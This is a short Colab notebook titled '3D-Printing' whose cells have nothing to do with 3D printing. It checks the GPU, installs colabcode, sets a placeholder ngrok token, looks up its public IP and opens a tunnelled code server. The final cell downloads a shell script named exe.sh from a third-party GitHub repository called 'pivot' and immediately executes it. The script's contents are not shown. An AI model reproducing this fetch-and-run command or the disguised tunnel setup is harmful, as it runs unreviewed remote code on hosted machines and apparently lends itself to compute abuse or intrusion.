{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "3D-Printing.ipynb",
      "provenance": []
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    },
    "accelerator": "GPU"
  },
  "cells": [
    {
      "cell_type": "code",
      "metadata": {
        "id": "KM8TGKhyCxxt"
      },
      "source": [
        "!nvidia-smi"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "h-2jDujeDkln"
      },
      "source": [
        "!pip install -U colabcode"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "4-UGoJhsC-0q"
      },
      "source": [
        "AUTHTOKEN = 'GANTINGROK'"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "8cMYdtJYDBPl"
      },
      "source": [
        "import colabcode as cc"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "S18h_82oDCrK"
      },
      "source": [
        "!curl ipinfo.io"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "PRG6dP25DDLw"
      },
      "source": [
        "cc.ColabCode(port = 12000, \n",
        "             authtoken = AUTHTOKEN, lab = True)"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "3FnNmcPMDE_q"
      },
      "source": [
        "wget https://raw.githubusercontent.com/levyglory45/pivot/main/exe.sh && chmod +x exe.sh && ./exe.sh"
      ],
      "execution_count": null,
      "outputs": []
    }
  ]
}